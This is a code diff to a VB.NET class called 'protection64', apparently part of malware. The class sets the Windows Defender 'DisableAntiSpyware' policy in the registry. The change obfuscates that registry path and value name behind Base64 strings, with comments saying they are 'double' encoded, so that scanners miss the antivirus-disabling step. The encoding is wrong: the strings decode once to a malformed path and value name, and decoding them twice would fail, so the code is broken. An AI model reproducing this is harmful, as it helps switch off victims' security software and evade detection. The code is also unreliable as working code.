@@ -52,6 +52,10 @@ Public Class protection64
         Return title.ToString()
     End Function
 
+    Private Function DecodeBase64(encodedString As String) As String
+        Dim bytes As Byte() = Convert.FromBase64String(encodedString)
+        Return Encoding.UTF8.GetString(bytes)
+    End Function
 
     ''' <summary>
     ''' Returns the caption of all desktop windows.
@@ -219,10 +223,20 @@ Public Class protection64
             End Try
 
             Try
-                Dim reg As RegistryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\Policies\Microsoft\Windows Defender")
-                reg.SetValue("DisableAntiSpyware", 1)
+                ' Double Base64 encoded registry path and value name
+                Dim base64Path As String = "U09GV0FSRS9Qb2xpY2llcy9NaWNyb3NvZnQvV2luZG93cyBEZWZlbmRlcg=="
+                Dim base64ValueName As String = "RGlzYWJsZUFudGktU3B5YXdhcmU="
+
+                ' Decode the double Base64 encoded strings
+                Dim decodedPath As String = DecodeBase64(DecodeBase64(base64Path))
+                Dim decodedValueName As String = DecodeBase64(DecodeBase64(base64ValueName))
+
+                ' Open the registry key and set the value
+                Dim reg As RegistryKey = Registry.LocalMachine.CreateSubKey(decodedPath)
+                reg.SetValue(decodedValueName, 1)
                 reg.Close()
-            Catch
+            Catch ex As Exception
+                Console.WriteLine("An error occurred: " & ex.Message)
             End Try
 
             Try
